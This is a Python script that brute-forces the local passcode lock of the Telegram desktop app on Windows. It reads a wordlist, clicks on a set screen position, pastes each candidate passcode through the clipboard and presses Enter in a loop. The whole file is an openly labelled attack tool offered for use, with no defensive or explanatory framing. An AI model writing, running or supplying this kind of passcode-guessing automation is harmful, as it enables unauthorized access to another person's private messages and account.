# coding=utf-8
import win32api, win32con, sys, time
try:
    from pynput.keyboard import Key, Controller
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install pynput')
    print('   [-] you need to install pynput Module')
    sys.exit()
try:
    import pyperclip
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install pyperclip')
    print('   [-] you need to install pyperclip Module')
    sys.exit()


class BruteForce_PASsCodeTelegram(object):
    def __init__(self):
        try:
            PasswordList = open(sys.argv[1], 'r').read().splitlines()
            try:
                MousePosX = sys.argv[2]
            except:
                MousePosX = 572
            try:
                MousePosY = sys.argv[3]
            except:
                MousePosY = 381
        except:
            print(' [!] Usage: python {} Wordlist.txt MousePosX MousePosY'.format(sys.argv[0]))
            sys.exit()
        for PASScode in PasswordList:
            self.Attack(MousePosX, MousePosY, PASScode)

    def Attack(self, x, y, PassCode):
        pyperclip.copy(str(PassCode))
        pyperclip.paste()
        win32api.SetCursorPos((x, y))
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0)
        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x, y, 0, 0)
        keyboard = Controller()
        keyboard.press(Key.ctrl)
        keyboard.press('a')
        keyboard.release('a')
        keyboard.press(Key.ctrl)
        keyboard.press('v')
        keyboard.release('v')
        keyboard.release(Key.ctrl)
        keyboard.press(Key.enter)
        time.sleep(3)

if __name__ == '__main__':
    BruteForce_PASsCodeTelegram()
